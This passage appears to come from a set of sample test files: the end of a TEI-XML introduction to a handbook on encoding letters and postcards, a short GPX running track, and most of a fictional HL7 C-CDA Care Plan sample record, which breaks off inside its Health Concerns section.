					CMIF and correspSearch.<note n="3" xml:id="fn3">Namely to Stefan Dumont, Sascha
						Grabsch, Marcel Illetschko, Jonas Müller-Laackman, Sabine Seifert, and Peter
						Stadler, <ref
							target="https://tei-c.org/activities/rahtz-prize-for-tei-ingenuity/."
							>https://tei-c.org/activities/rahtz-prize-for-tei-ingenuity/</ref>.</note></p>
				<p n="6">However, there are still open questions on how to deal with several
					structural and textual occurrences, and work on creating an exhaustive
					environment for the TEI encoding of letters is not yet finished. As a next step,
					we decided to hold a workshop on these “Challenges of Letter Encoding” which
					would provide a forum for further discussions on problematic cases of
					correspondence encoding in TEI. The aim was to develop solutions and best
					practices within the range of possibilities already offered by the TEI, and, if
					necessary, to produce suggestions of potential extensions to the TEI.</p>
				<p n="7">The workshop was funded by CLARIN-D and was held at the Berlin-Brandenburg
					Academy of Sciences and Humanities (BBAW) in Berlin (Germany) in October 2018.
					We invited early-career researchers who deal with TEI encoding and/or especially
					correspondence encoding in the course of their daily work, as well as one member
					of the TEI Council for advice on proposals for TEI extensions. Some 20
					participants from 15 institutions in Germany, Austria and Switzerland got
					together for the workshop.</p>
				<p n="8">Before the event, we gathered examples of insecurities or problems with
					applying TEI to correspondence texts from the participants, which were then
					dealt with in the course of the workshop. Based on this material, we formed five
					groups of (roughly) related encoding issues, and 4-5 participants per group were
					asked to discuss the given issues: <list>
						<item>Group I: Text structures I (dealing with openers, closers,
							postscripts)</item>
						<item>Group II: Text structures II (dealing with pre-printed parts like
							letterheads, addresses, stamps, seals, postcards etc.)</item>
						<item>Group III: Metadata I (dealing with attachments, roles like author,
							scribe, and sender, actions like commenting etc.)</item>
						<item>Group IV: Metadata II (dealing with unclear information)</item>
						<item>Group V: CMIF and Metadata (dealing with the extension of CMIF,
							authority files and modelling correspondence in RDF)</item>
					</list></p>
				<p n="9">The meeting was designed as a hands-on workshop, enabling the groups of
					participants to discuss the issues and material presented to them and to develop
					solutions. These sessions of group work were alternating with plenary sessions
					for discussions of problems and solutions across groups. All issues discussed
					concerned aspects of letter or postcard encoding: from correspondence-specific
					text structures to correspondence metadata. Subsequent to the workshop, the
					problems, discussions, and recommendations were summarized as handbook articles
					by the workshop participants. The articles underwent an internal review phase,
					and are now published in successive stages on this website for the community to
					comment and review. The articles now online and the ones coming soon are all in
					version 1 and remain as such stable. The public review phase lasts until 30
					April 2020. Then, all articles will be revised and adapted, and made available
					in their final version here, as a version 2 of the handbook. </p>
				<p n="10">This resulting handbook “Encoding Correspondence. A manual for encoding
					letters and postcards in TEI-XML and DTABf” is meant as a guide for annotators
					on characteristic and recurring problems of letter encoding in TEI, offering
					solutions and recommendations based on the TEI Guidelines, as well as possible
					extensions to the TEI. Next to these articles discussing the respective issues
					in a more or less longer manner, we plan, as a long-term objective, to provide a
					best practice guide of how to encode correspondence material for a quick and
					short overview.</p>
				<p n="11">The literature used as well as the bibliographic information for each
					article itself are additionally stored in the <ref
						target="https://www.zotero.org/groups/2248469/encoding_correspondence/"
						>Zotero group "Encoding Correspondence"</ref> and embedded as <ref
						target="https://en.wikipedia.org/wiki/COinS">"COinS"</ref> in the HTML
					version of this manual. Therefore, one can add the bibliographic data to a
					literature management software with the appropriate browser extension (e.g. with
					Zotero or the Citavi Picker).</p>
				<p n="12">As this is a community effort, we kindly invite you to comment on or
					review the articles, ask questions, give feedback, add examples of
					correspondence or encoding, or whatever you find helpful for making this a
					valuable resource for encoders of correspondence. This can be done with the
					easy-to-use annotating tool <ref target="https://web.hypothes.is/"
						>Hypothes.is</ref> or by using the e-mail button at the side of each
					article.</p>
				<p n="13">The complete handbook with all articles (but except the comments via
					Hypothes.is) is availabe for download at GitHub: <ref
						target="https://github.com/TEI-Correspondence-SIG/encoding-correspondence"
						>https://github.com/TEI-Correspondence-SIG/encoding-correspondence</ref>.</p>
			</div>
			<div type="bibliography">
				<head>Bibliography</head>
				<listBibl>
					<bibl
						sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/9VYYBMPJ"
						>Dumont, Stefan. 2016. ‟correspSearch – Connecting Scholarly Editions of
						Letters.ˮ <hi rendition="#i">Journal of the Text Encoding Initiative</hi>
						10. <ref target="http://journals.openedition.org/jtei/1742"
							>http://journals.openedition.org/jtei/1742</ref>.</bibl>
					<bibl
						sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/ZJYUY9AL"
						>Haaf, Susanne, Alexander Geyken, and Frank Wiegand. 2014/15. ‟The DTA 'Base
						Format': A TEI Subset for the Compilation of a Large Reference Corpus of
						Printed Text from Multiple Sources.ˮ <hi rendition="#i">Journal of the Text
							Encoding Initiative</hi> 8. <ref
							target="http://journals.openedition.org/jtei/1114"
							>http://journals.openedition.org/jtei/1114</ref>.</bibl>
					<bibl
						sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/3KQ6GAUR"
						>Haaf, Susanne and Christian Thomas. 2017. ‟Enabling the Encoding of
						Manuscripts within the DTABf: Extension and Modularization of the Format.ˮ
							<hi rendition="#i">Journal of the Text Encoding Initiative</hi> 10
						(2016–2019). <ref target="http://journals.openedition.org/jtei/1650"
							>http://journals.openedition.org/jtei/1650</ref>.</bibl>
					<bibl
						sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/KEWAE85C"
						>Stadler, Peter, Marcel Illetschko, and Sabine Seifert. 2016. ‟Towards a
						Model for Encoding Correspondence in the TEI: Developing and Implementing
						&lt;correspDesc&gt;.ˮ <hi rendition="#i">Journal of the Text Encoding
							Initiative</hi> 9. <ref target="https://dx.doi.org/10.4000/jtei.1742"
							>https://dx.doi.org/10.4000/jtei.1742</ref>.</bibl>
					<bibl
						sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/TMLGNZ5L"
						>TEI Consortium, ed. 2019. ‟Correspondence Description.ˮ In <hi
							rendition="#i">TEI P5: Guidelines for Electronic Text Encoding and
							Interchange</hi>. Version 3.6.0, 63–65. <ref
							target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/HD.html#HD44CD"
							>https://www.tei-c.org/release/doc/tei-p5-doc/en/html/HD.html#HD44CD</ref>.</bibl>
				</listBibl>
			</div>
		</body>
	</text>
</TEI>
</file>

<file path="sample_data/test_files/small/gpx/sample-track.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx
  version="1.1"
  creator="Runkeeper - http://www.runkeeper.com"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns="http://www.topografix.com/GPX/1/1"
  xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd"
  xmlns:gpxtpx="http://www.garmin.com/xmlschemas/TrackPointExtension/v1">
<wpt lat="37.778259000" lon="-122.391386000"><ele>3.4</ele><time>2016-06-17T23:41:03Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
<wpt lat="37.778194000" lon="-122.391226000"><ele>3.4</ele><time>2016-06-17T23:41:13Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
<wpt lat="37.778297000" lon="-122.391174000"><ele>3.4</ele><time>2016-06-17T23:41:18Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
<wpt lat="37.778378000" lon="-122.391117000"><ele>3.4</ele><time>2016-06-17T23:41:23Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
<wpt lat="37.778449000" lon="-122.391039000"><ele>3.4</ele><time>2016-06-17T23:41:26Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
<wpt lat="37.778525000" lon="-122.390942000"><ele>3.4</ele><time>2016-06-17T23:41:29Z</time><extensions><gpxtpx:TrackPointExtension><gpxtpx:hr>171</gpxtpx:hr></gpxtpx:TrackPointExtension></extensions></wpt>
</gpx>
</file>

<file path="sample_data/test_files/small/hl7/ccda-care-plan.xml">
<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>
<!--
 Title:        Care Plan
 Filename:     C-CDA_R2_Care_Plan.xml
 Created by:   Lantana Consulting Group, LLC
 
 $LastChangedDate: 2014-11-12 23:25:09 -0500 (Wed, 12 Nov 2014) $
  
 ********************************************************
 Disclaimer: This sample file contains representative data elements to represent a Care Plan. 
 The file depicts a fictional character's health data. Any resemblance to a real person is coincidental. 
 To illustrate as many data elements as possible, the clinical scenario may not be plausible. 
 The data in this sample file is not intended to represent real patients, people or clinical events. 
 This sample is designed to be used in conjunction with the C-CDA Clinical Notes Implementation Guide.
 ********************************************************
  -->
<ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="urn:hl7-org:v3" xmlns:voc="urn:hl7-org:v3/voc" xmlns:sdtc="urn:hl7-org:sdtc">
	<!-- ** CDA Header ** -->
	<realmCode code="US"/>
	<typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
	<templateId root="2.16.840.1.113883.10.20.22.1.15"/>
	<id root="db734647-fc99-424c-a864-7e3cda82e703"/>
	<code code="52521-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Overall Plan of Care/Advance Care Directives"/>
	<title>Good Health Hospital Care Plan</title>
	<effectiveTime value="201308201120-0800"/>
	<confidentialityCode code="N" codeSystem="2.16.840.1.113883.5.25" displayName="normal" />
	<languageCode code="en-US"/>
	<!-- This document is the second document in the set (see setId for id for the set -->
	<setId root="004bb033-b948-4f4c-b5bf-a8dbd7d8dd40"/>
	<!-- See relatedDocument for the previous version in the set -->
	<versionNumber value="2"/>
	<!-- Patient (recordTarget) -->
	<recordTarget>
		<patientRole>
			<id extension="444222222" root="2.16.840.1.113883.4.1"/>
			<!-- Example Social Security Number using the actual SSN OID. -->
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>2222 Home Street</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97867</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:+1(555)555-2003" use="HP"/>
			<!-- HP is "primary home" from HL7 AddressUse 2.16.840.1.113883.5.1119 -->
			<patient>
				<!-- The first name element represents what the patient is known as -->
				<name use="L">
					<given>Eve</given>
					<!-- The "SP" is "Spouse" from HL7 Code System EntityNamePartQualifier 2.16.840.1.113883.5.43 -->
					<family qualifier="SP">Betterhalf</family>
				</name>
				<!-- The second name element represents another name associated with the patient -->
				<name use="SRCH">
					<given>Eve</given>
					<!-- The "BR" is "Birth" from HL7 Code System EntityNamePartQualifier 2.16.840.1.113883.5.43 -->
					<family qualifier="BR">Everywoman</family>
				</name>
				<administrativeGenderCode code="F" displayName="Female" codeSystem="2.16.840.1.113883.5.1" codeSystemName="AdministrativeGender"/>
				<!-- Date of birth need only be precise to the day -->
				<birthTime value="19750501"/>
				<maritalStatusCode code="M" displayName="Married" codeSystem="2.16.840.1.113883.5.2" codeSystemName="MaritalStatusCode"/>
				<religiousAffiliationCode code="1013" displayName="Christian (non-Catholic, non-specific)" codeSystem="2.16.840.1.113883.5.1076" codeSystemName="HL7 Religious Affiliation"/>
				<!-- CDC Race and Ethnicity code set contains the five minimum race and ethnicity categories defined by OMB Standards -->
				<raceCode code="2106-3" displayName="White" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<!-- The raceCode extension is only used if raceCode is valued -->
				<sdtc:raceCode code="2076-8" displayName="Native Hawaiian or Other Pacific Islander" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<ethnicGroupCode code="2186-5" displayName="Not Hispanic or Latino" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<guardian>
					<code code="POWATT" displayName="Power of Attorney" codeSystem="2.16.840.1.113883.1.11.19830" codeSystemName="ResponsibleParty"/>
					<addr use="HP">
						<streetAddressLine>2222 Home Street</streetAddressLine>
						<city>Beaverton</city>
						<state>OR</state>
						<postalCode>97867</postalCode>
						<country>US</country>
					</addr>
					<telecom value="tel:+1(555)555-2008" use="MC"/>
					<guardianPerson>
						<name>
							<given>Boris</given>
							<given qualifier="CL">Bo</given>
							<family>Betterhalf</family>
						</name>
					</guardianPerson>
				</guardian>
				<birthplace>
					<place>
						<addr>
							<streetAddressLine>4444 Home Street</streetAddressLine>
							<city>Beaverton</city>
							<state>OR</state>
							<postalCode>97867</postalCode>
							<country>US</country>
						</addr>
					</place>
				</birthplace>
				<languageCommunication>
					<languageCode code="eng"/>
					<!-- "eng" is ISO 639-2 alpha-3 code for "English" -->
					<modeCode code="ESP" displayName="Expressed spoken" codeSystem="2.16.840.1.113883.5.60" codeSystemName="LanguageAbilityMode"/>
					<proficiencyLevelCode code="G" displayName="Good" codeSystem="2.16.840.1.113883.5.61" codeSystemName="LanguageAbilityProficiency"/>
					<!-- Patient's preferred language -->
					<preferenceInd value="true"/>
				</languageCommunication>
			</patient>
			<providerOrganization>
				<id extension="219BX" root="2.16.840.1.113883.4.6"/>
				<name>The DoctorsTogether Physician Group</name>
				<telecom use="WP" value="tel: +1(555)555-5000"/>
				<addr>
					<streetAddressLine>1007 Health Drive</streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>99123</postalCode>
					<country>US</country>
				</addr>
			</providerOrganization>
		</patientRole>
	</recordTarget>
	<!-- Author -->
	<author>
		<time value="20130730"/>
		<assignedAuthor>
			<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
			<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)" displayName="Nursing Service Providers; Registered Nurse"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedPerson>
				<name>
					<given>Nurse</given>
					<family>Nightingale</family>
					<suffix>RN</suffix>
				</name>
			</assignedPerson>
			<representedOrganization>
				<id root="2.16.840.1.113883.19.5"/>
				<name>Good Health Hospital</name>
			</representedOrganization>
		</assignedAuthor>
	</author>
	<!-- Data Enterer -->
	<dataEnterer>
		<assignedEntity>
			<id extension="333777777" root="2.16.840.1.113883.4.6"/>
			<addr>
				<streetAddressLine>1007 Healthcare Drive</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-1050"/>
			<assignedPerson>
				<name>
					<given>Ellen</given>
					<family>Enter</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</dataEnterer>
	<!-- Informant -->
	<informant>
		<assignedEntity>
			<id extension="888888888" root="2.16.840.1.113883.19.5"/>
			<addr>
				<streetAddressLine>1007 Healthcare Drive</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-1003"/>
			<assignedPerson>
				<name>
					<given>Harold</given>
					<family>Hippocrates</family>
					<suffix qualifier="AC">D.O.</suffix>
				</name>
			</assignedPerson>
		</assignedEntity>
	</informant>
	<!-- Custodian -->
	<custodian>
		<assignedCustodian>
			<representedCustodianOrganization>
				<id extension="321CX" root="2.16.840.1.113883.4.6"/>
				<name>Good Health HIE</name>
				<telecom use="WP" value="tel:+1(555)555-1009"/>
				<addr use="WP">
					<streetAddressLine>1009 Healthcare Drive </streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>99123</postalCode>
					<country>US</country>
				</addr>
			</representedCustodianOrganization>
		</assignedCustodian>
	</custodian>
	<informationRecipient>
		<intendedRecipient>
			<!-- Receiving Person Provider Id -->
			<id root="a1cd2b74-c6de-44ee-b552-3adacb7983cc"/>
			<!-- Receiving Medicare/Medicaid Provider Id-->
			<id root="c72f64c2-b1db-444b-bbff-4d2e1d6bd659"/>
			<!-- Receiving Person ID-->
			<id root="fa883fee-b255-4465-8fb5-1d8135e39896"/>
			<!-- Receiving Person Address-->
			<addr>
				<streetAddressLine>100 Better Health Rd.</streetAddressLine>
				<city>Ann Arbor</city>
				<state>MI</state>
				<postalCode>97857</postalCode>
				<country>US</country>
			</addr>
			<informationRecipient>
				<!-- Receiving Person Name-->
				<name>
					<given>Nurse</given>
					<family>Caresalot</family>
					<suffix>RN</suffix>
				</name>
			</informationRecipient>
			<receivedOrganization>
				<!-- Receiving Organization Id-->
				<id root="c4c416a7-aeeb-4dcc-9662-ab836ff4d265"/>
				<!-- Receiving Organization Provider ID (NPI) -->
				<id root="ab47f3c4-1267-4b9e-9a29-e966b5a861c8"/>
				<!-- Receiving Organization Name -->
				<name>Better Health Hospital</name>
				<!-- Receiving Organization Address -->
				<addr>
					<streetAddressLine>100 Better Health Rd.</streetAddressLine>
					<city>Ann Arbor</city>
					<state>MI</state>
					<postalCode>97857</postalCode>
					<country>US</country>
				</addr>
				<!-- Receiving Care Setting Type Description: displayName.  Receiving Care Setting Type Code: code -->
				<standardIndustryClassCode displayName="Long Term Care Hospital" code="282E00000X" codeSystem="2.16.840.1.114222.4.11.1066" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
			</receivedOrganization>
		</intendedRecipient>
	</informationRecipient>
	<!-- Legal Authenticator -->
	<legalAuthenticator>
		<time value="20130730"/>
		<signatureCode code="S"/>
		<sdtc:signatureText mediaType="text/xml" representation="B64">omSJUEdmde9j44zmMiromSJUEdmde9j44zmMirdMDSsWdIJdksIJR3373jeu83
      6edjzMMIjdMDSsWdIJdksIJR3373jeu83MNYD83jmMdomSJUEdmde9j44zmMir ...
      MNYD83jmMdomSJUEdmde9j44zmMir6edjzMMIjdMDSsWdIJdksIJR3373jeu83
      4zmMir6edjzMMIjdMDSsWdIJdksIJR3373jeu83==</sdtc:signatureText>
		<assignedEntity>
			<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
			<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" displayName="Nursing Service Providers; Registered Nurse"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedPerson>
				<name>
					<given>Nurse</given>
					<family>Nightingale</family>
					<suffix>RN</suffix>
				</name>
			</assignedPerson>
			<representedOrganization>
				<id root="2.16.840.1.113883.19.5"/>
				<name>Good Health Hospital</name>
				<!-- the orgnaization id and name -->
			</representedOrganization>
		</assignedEntity>
	</legalAuthenticator>
	<!-- This authenticator represents patient agreement or sign-off of the Care Plan-->
	<authenticator>
		<time value="20130802"/>
		<signatureCode code="S"/>
		<sdtc:signatureText mediaType="text/xml" representation="B64">omSJUEdmde9j44zmMiromSJUEdmde9j44zmMirdMDSsWdIJdksIJR3373jeu83
      6edjzMMIjdMDSsWdIJdksIJR3373jeu83MNYD83jmMdomSJUEdmde9j44zmMir ...
      MNYD83jmMdomSJUEdmde9j44zmMir6edjzMMIjdMDSsWdIJdksIJR3373jeu83
      4zmMir6edjzMMIjdMDSsWdIJdksIJR3373jeu83==</sdtc:signatureText>
		<assignedEntity>
			<id extension="444222222" root="2.16.840.1.113883.4.1"/>
			<code code="ONESELF" displayName="self" codeSystem="2.16.840.1.113883.5.111" codeSystemName="RoleCode"/>
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>2222 Home Street</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97867</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:+1(555)555-2003" use="HP"/>
			<assignedPerson>
				<name use="L">
					<given>Eve</given>
					<family qualifier="SP">Everywoman</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</authenticator>
	<!-- This participant represents the person who reviewed the Care Plan. If the date in the time element is in the past, then this review has already taken place. 
         If the date in the time element is in the future, then this is the date of the next scheduled review. -->
	<!-- This example shows a Care Plan Review that has already taken place -->
	<participant typeCode="VRF">
		<functionCode code="425268008" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Review of care plan"/>
		<time value="20130801"/>
		<associatedEntity classCode="ASSIGNED">
			<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
		</associatedEntity>
	</participant>
	<!-- This participant represents the person who reviewed the Care Plan.   If the date in the time element is in the past, then this review has already taken place. 
  If the date in the time element is in the future,  then this is the date of the next scheduled review. -->
	<!-- This example shows a Scheduled Care Plan Review that is in the future -->
	<participant typeCode="VRF">
		<functionCode code="425268008" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Review of care plan"/>
		<time value="20131001"/>
		<associatedEntity classCode="ASSIGNED">
			<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
			<code code="SELF" displayName="self" codeSystem="2.16.840.1.113883.5.111"/>
		</associatedEntity>
	</participant>
	<!-- This participant identifies individuals who support the patient such as a relative or caregiver -->
	<participant typeCode="IND">
		<!-- Emergency Contact  -->
		<associatedEntity classCode="ECON">
			<addr>
				<streetAddressLine>17 Daws Rd.</streetAddressLine>
				<city>Ann Arbor</city>
				<state>MI</state>
				<postalCode>97857</postalCode>
				<country>US</country>
			</addr>
			<telecom value="tel:(999)555-1212" use="WP"/>
			<associatedPerson>
				<name>
					<prefix>Mrs.</prefix>
					<given>Martha</given>
					<family>Jones</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>
	<!-- This participant identifies individuals who support the patient such as a relative or caregiver -->
	<participant typeCode="IND">
		<!-- Caregiver -->
		<associatedEntity classCode="CAREGIVER">
			<addr>
				<streetAddressLine>17 Daws Rd.</streetAddressLine>
				<city>Ann Arbor</city>
				<state>MI</state>
				<postalCode>97857</postalCode>
				<country>US</country>
			</addr>
			<telecom value="tel:(999)555-1212" use="WP"/>
			<associatedPerson>
				<name>
					<prefix>Mrs.</prefix>
					<given>Martha</given>
					<family>Jones</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>
	<documentationOf>
		<serviceEvent classCode="PCPR">
			<effectiveTime>
				<low value="20130720"/>
				<high value="20130815"/>
			</effectiveTime>
			<!-- The performer(s) represents the healthcare providers involved in the current or historical care of the patient.
                The patient’s key healthcare providers would be listed here which would include the primary physician and any 
                active consulting physicians, therapists, counselors, and care team members.  -->
			<performer typeCode="PRF">
				<time value="20130715223615-0800"/>
				<assignedEntity>
					<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
					<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
					<addr>
						<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
						<city>Portland</city>
						<state>OR</state>
						<postalCode>99123</postalCode>
						<country>US</country>
					</addr>
					<telecom use="WP" value="tel:+1(555)-1004"/>
					<assignedPerson>
						<name>
							<given>Patricia</given>
							<given qualifier="CL">Patty</given>
							<family>Primary</family>
							<suffix qualifier="AC">M.D.</suffix>
						</name>
					</assignedPerson>
				</assignedEntity>
			</performer>
		</serviceEvent>
	</documentationOf>
	<!-- The Care Plan is continually evolving and dynamic. The Care Plan CDA instance 
     is NOT dynamic. Each time a Care Plan CDA is generated it represents a snapshot 
     in time of the Care Plan at that moment. Whenever a care provider or patient 
     generates a Care Plan, it should be noted through relatedDocument 
     whether the current Care Plan replaces or appends another Care Plan. 
     The relatedDocumentTypeCode indicates whether the current document is 
     an addendum to the ParentDocument (APND (append)) or the current document 
     is a replacement of the ParentDocument (RPLC (replace)). -->
	<!-- This document is the second in a set - relatedDocument
      describes the parent document-->
	<relatedDocument typeCode="RPLC">
		<parentDocument>
			<id root="223769be-f6ee-4b04-a0ce-b56ae998c880"/>
			<code code="CarePlan-x" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Care Plan"/>
			<setId root="004bb033-b948-4f4c-b5bf-a8dbd7d8dd40"/>
			<versionNumber value="1"/>
		</parentDocument>
	</relatedDocument>
	<componentOf>
		<encompassingEncounter>
			<id extension="9937012" root="2.16.840.1.113883.19"/>
			<code codeSystem="2.16.840.1.113883.5.4" code="IMP" displayName="Inpatient"/>
			<!-- captures that this is an inpatient encounter -->
			<effectiveTime>
				<low value="20130615"/>
				<!-- No high value - this patient is still in hospital -->
			</effectiveTime>
		</encompassingEncounter>
	</componentOf>
	<!-- 
********************************************************
CDA Body
********************************************************
-->
	<component>
		<structuredBody>
			<!-- 
********************************************************
Health Concerns section
********************************************************
-->
			<component>
				<section>
					<!-- Health Concerns Section -->
					<templateId root="2.16.840.1.113883.10.20.22.2.58"/>
					<code code="75310-3" displayName="Health Concerns Document" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Health Concerns Section</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Concern</th>
									<th>Status</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Current every day smoker</td>
									<td>Active</td>
									<td>Concern from June 16, 2013</td>
								</tr>
								<tr>
									<td>Respiratory insufficiency</td>
									<td>Completed</td>
									<td>Concern from June 13, 2013</td>
								</tr>
								<tr>
									<td>Pneumonia</td>
									<td>Completed</td>
									<td>June 16, 2013</td>
								</tr>
							</tbody>
						</table>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Related observation</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Productive cough</td>
									<td>June 15, 2013</td>
								</tr>
							</tbody>
						</table>
						<paragraph styleCode="Bold">Patient priority:</paragraph> high priority <paragraph styleCode="Bold">Provider
              priority:</paragraph> high priority<br/>
						<br/>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Risk</th>
									<th>Status</th>
									<th>Effective Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Malignant neoplastic disease</td>
									<td>Active</td>
									<td>June 16, 2013</td>
								</tr>
							</tbody>
						</table>
						<br/>
						<paragraph styleCode="Bold">Patient priority:</paragraph> high priority <paragraph styleCode="Bold">Provider
              priority:</paragraph> high priority<br/>
					</text>
					<entry>
						<!-- Health Concern Act -->
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.132"/>
							<id root="4eab0e52-dd7d-4285-99eb-72d32ddb195c"/>
							<code code="75310-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Health Concern"/>
							<!-- This Health Concern has a statusCode of active because it is an active concern -->
							<statusCode code="active"/>
							<!-- The effective time is the date that the Health Concern started being followed - 
                                 this does not necessarily correlate to the onset date of the contained health issues-->
							<effectiveTime value="20130616"/>
							<!-- Health Concern: Current every day smoker-->
							<entryRelationship typeCode="REFR">
								<!-- Tobacco Use (V2) -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.85" extension="2014-06-09"/>
									<id root="031b375e-e1aa-4602-9855-f65ec3bbee50"/>
									<code code="11367-0" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="History of tobacco use"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<!-- The low value reflects the start date of the current or past tobacco use observation -->
										<low value="20090214"/>
									</effectiveTime>
									<value xsi:type="CD" code="449868002" displayName="Smokes tobacco daily" codeSystem="2.16.840.1.113883.6.96"/>
								</observation>
							</entryRelationship>
							<!-- Health Concern Problem: Respiratory insufficiency -->
							<entryRelationship typeCode="REFR">
								<!-- Problem Observation (V2) -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2014-06-09"/>
									<id root="8dfacd73-1682-4cc4-9351-e54ccea83612"/>
									<code code="75326-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Problem"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<!-- Onset date of the problem -->
										<low value="20130613"/>
									</effectiveTime>
									<value xsi:type="CD" code="409623005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Respiratory insufficiency"/>
								</observation>
							</entryRelationship>
							<!-- Health Concern Diagnosis: Pneumonia -->
							<entryRelationship typeCode="REFR">
								<!-- Problem Observation (V2) -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2014-06-09"/>
									<id root="8dfacd73-1682-4cc4-9351-e54ccea83612"/>
									<code code="29308-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Diagnosis"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<!-- Date of diagnosis -->
										<low value="20130616"/>
									</effectiveTime>
									<value xsi:type="CD" code="233604007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Pneumonia"/>
									<!--<!-\- This Entry Reference refers to a goal, intervention, actual outcome, 
                                    or some other entry present in the Care Plan that the Health Concern is related to-\->
                                     <entryRelationship typeCode="REFR">
                                        <act classCode="ACT" moodCode="EVN">
